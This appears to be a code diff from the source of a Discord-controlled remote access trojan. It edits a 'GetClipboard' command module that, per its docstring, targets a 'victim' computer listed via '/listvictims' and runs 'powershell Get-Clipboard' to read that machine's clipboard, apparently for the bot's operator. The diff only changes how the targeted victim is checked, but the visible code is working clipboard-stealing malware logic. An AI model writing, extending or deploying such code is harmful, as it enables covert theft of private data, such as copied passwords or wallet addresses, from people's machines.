@@ -17,7 +17,7 @@ class GetClipboard(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             outp = os.popen("powershell Get-Clipboard").read()
